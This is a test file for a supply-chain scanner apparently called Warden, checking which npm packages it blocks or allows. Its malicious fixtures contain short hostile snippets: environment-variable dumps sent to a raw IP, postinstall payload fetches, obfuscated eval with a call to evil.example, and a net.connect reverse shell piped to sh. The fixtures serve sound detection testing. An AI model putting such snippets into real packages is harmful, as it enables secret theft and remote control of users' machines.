import { test, expect, describe } from "bun:test";
import { analyze, type AnalysisInput } from "@warden/heuristics";
import { score } from "../src/index.ts";
import type { Category } from "@warden/schema";

function verdictFor(input: AnalysisInput) {
  const established = (input.meta.weeklyDownloads ?? 0) >= 100_000;
  return score(analyze(input), {
    package: input.name,
    version: input.version,
    integrity: "sha512-test",
    source: "heuristics",
    established,
  });
}

const blob = (n: number) => "Q".repeat(n); // trips the encoded-blob / long-line obfuscation checks

// --- Benign corpus: must NEVER block (allow or warn only) --------------------
describe("false-positive corpus (must not block)", () => {
  const benign: Record<string, AnalysisInput> = {
    esbuild: {
      name: "esbuild",
      version: "0.21.5",
      isNewPackage: true,
      meta: { maintainers: ["evanw"], existsOnRegistry: true, weeklyDownloads: 40_000_000, ageDays: 120 },
      addedScripts: { postinstall: "node install.js" },
      changedScripts: {},
      scanFiles: [{ path: "install.js", text: "const https=require('https');https.get('https://registry.npmjs.org/esbuild-linux/-/bin.tgz');" }],
    },
    "node-gyp": {
      name: "node-gyp",
      version: "10.0.0",
      isNewPackage: true,
      meta: { maintainers: ["npm"], existsOnRegistry: true, weeklyDownloads: 60_000_000, ageDays: 200 },
      addedScripts: { install: "node-gyp rebuild" },
      changedScripts: {},
      scanFiles: [],
    },
    next: {
      name: "next",
      version: "15.0.0",
      isNewPackage: true,
      meta: { maintainers: ["vercel"], existsOnRegistry: true, weeklyDownloads: 8_000_000, ageDays: 60 },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "dist/compiled/index.js", text: `var _bundle="${blob(2100)}";fetch("/_next/data");` }],
    },
    "@babel/core": {
      name: "@babel/core",
      version: "7.28.0",
      isNewPackage: true,
      meta: { maintainers: ["babel"], existsOnRegistry: true, weeklyDownloads: 30_000_000, ageDays: 90 },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "lib/x.js", text: `var b="${blob(2100)}";Buffer.from(b,"base64");` }],
    },
    "class-names": {
      name: "class-names",
      version: "1.0.0",
      isNewPackage: true,
      meta: { maintainers: ["dev"], existsOnRegistry: true, weeklyDownloads: 5_000_000, ageDays: 300 },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "index.js", text: "module.exports=function(){return '';};" }],
    },
    // Real-world regressions (see task-tracker/issues.md): these all FALSE-BLOCKED
    // before recalibration because network/env capability was scored as exfil.
    "express-like (uses http + env, no raw IP)": {
      name: "express",
      version: "5.0.0",
      isNewPackage: true,
      meta: { maintainers: ["dougwilson"], existsOnRegistry: true, weeklyDownloads: 30_000_000, ageDays: 120 },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "lib/app.js", text: "const http=require('http');const port=process.env.PORT;module.exports=()=>http.createServer();" }],
    },
    "native-installer (install script + child_process + https download)": {
      name: "esbuild",
      version: "0.21.5",
      isNewPackage: true,
      meta: { maintainers: ["evanw"], existsOnRegistry: true, weeklyDownloads: 40_000_000, ageDays: 120 },
      addedScripts: { postinstall: "node install.js" },
      changedScripts: {},
      scanFiles: [{ path: "install.js", text: "const cp=require('child_process');const https=require('https');const proxy=process.env.HTTPS_PROXY;https.get('https://registry.npmjs.org/esbuild-bin');" }],
    },
    "deprecated http library (request)": {
      name: "request",
      version: "2.88.2",
      isNewPackage: true,
      meta: { maintainers: ["mikeal"], existsOnRegistry: true, weeklyDownloads: 10_000_000, ageDays: 900, deprecated: true },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "index.js", text: "const http=require('http');const https=require('https');const t=process.env.NODE_TLS_REJECT_UNAUTHORIZED;" }],
    },
  };

  for (const [name, input] of Object.entries(benign)) {
    test(`${name} is not blocked`, () => {
      const v = verdictFor(input);
      expect(v.verdict).not.toBe("block");
    });
  }
});

// --- Malicious corpus: must block, for the RIGHT categories ------------------
describe("true-positive corpus (must block for the right reason)", () => {
  const cases: Array<{ name: string; input: AnalysisInput; category: Category }> = [
    {
      name: "lodahs (typosquat)",
      category: "typosquat",
      input: {
        name: "lodahs",
        version: "1.0.0",
        isNewPackage: true,
        meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 47, ageDays: 0.3 },
        addedScripts: {},
        changedScripts: {},
        scanFiles: [],
      },
    },
    {
      name: "axios (compromise: provenance downgrade + exfil)",
      category: "provenance_downgrade",
      input: {
        name: "axios",
        version: "1.14.1",
        isNewPackage: false,
        meta: {
          maintainers: ["attacker"],
          previousMaintainers: ["jasonsaayman"],
          previousHadProvenance: true,
          hasProvenance: false,
          existsOnRegistry: true,
          weeklyDownloads: 100_000_000,
          ageDays: 0.1,
        },
        addedScripts: { postinstall: "node ./setup.js" },
        changedScripts: {},
        scanFiles: [{ path: "setup.js", text: "const cp=require('child_process');const h=require('https');const t=JSON.stringify(process.env);h.request('http://185.62.1.9/c2');" }],
      },
    },
    {
      name: "chalk-style (obfuscation + network)",
      category: "obfuscation",
      input: {
        name: "chalk-styler",
        version: "1.0.0",
        isNewPackage: true,
        meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 200, ageDays: 1 },
        addedScripts: {},
        changedScripts: {},
        scanFiles: [{ path: "index.js", text: `var _0x1a2b="${blob(2100)}";fetch("http://evil.example/x");eval(_0x1a2b);` }],
      },
    },
    {
      name: "react-codeshift (slopsquat)",
      category: "slopsquat",
      input: {
        name: "react-codeshift",
        version: "1.0.0",
        isNewPackage: true,
        meta: { maintainers: [], existsOnRegistry: false },
        addedScripts: {},
        changedScripts: {},
        scanFiles: [],
      },
    },
  ];

  for (const { name, input, category } of cases) {
    test(`${name} blocks with category ${category}`, () => {
      const v = verdictFor(input);
      expect(v.verdict).toBe("block");
      expect(v.categories).toContain(category);
    });
  }
});

// --- Individual block policies not exercised by the corpus -------------------
describe("block policy edge cases", () => {
  test("reverse shell blocks even without an install script", () => {
    const v = verdictFor({
      name: "innocuous-logger",
      version: "1.0.0",
      isNewPackage: true,
      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 40, ageDays: 2 },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "index.js", text: "const net=require('net');const s=net.connect(4444,'h');const p=spawn('sh');s.pipe(p.stdin);" }],
    });
    expect(v.verdict).toBe("block");
    expect(v.summary).toContain("reverse shell");
  });

  test("install script + raw-IP sink blocks (lifecycle sink correlation)", () => {
    const v = verdictFor({
      name: "fresh-miner",
      version: "1.0.0",
      isNewPackage: true,
      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 10, ageDays: 1 },
      addedScripts: { postinstall: "node payload.js" },
      changedScripts: {},
      scanFiles: [{ path: "payload.js", text: "require('https').get('http://185.62.1.9/payload');" }],
    });
    expect(v.verdict).toBe("block");
    expect(v.summary).toContain("install-time script");
  });

  test("a lone install script on a non-established package warns, never blocks", () => {
    const v = verdictFor({
      name: "native-thing",
      version: "1.0.0",
      isNewPackage: true,
      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 50, ageDays: 3 },
      addedScripts: { postinstall: "node-gyp rebuild" },
      changedScripts: {},
      scanFiles: [],
    });
    expect(v.verdict).toBe("warn");
  });

  test("env dump sent to a raw IP blocks without any install script", () => {
    const v = verdictFor({
      name: "telemetry-helper",
      version: "1.0.0",
      isNewPackage: true,
      meta: { maintainers: ["x"], existsOnRegistry: true, weeklyDownloads: 10, ageDays: 1 },
      addedScripts: {},
      changedScripts: {},
      scanFiles: [{ path: "index.js", text: "const b=JSON.stringify(process.env);fetch('http://185.62.1.9/c',{method:'POST',body:b});" }],
    });
    expect(v.verdict).toBe("block");
    expect(v.summary).toContain("environment variables");
  });
});
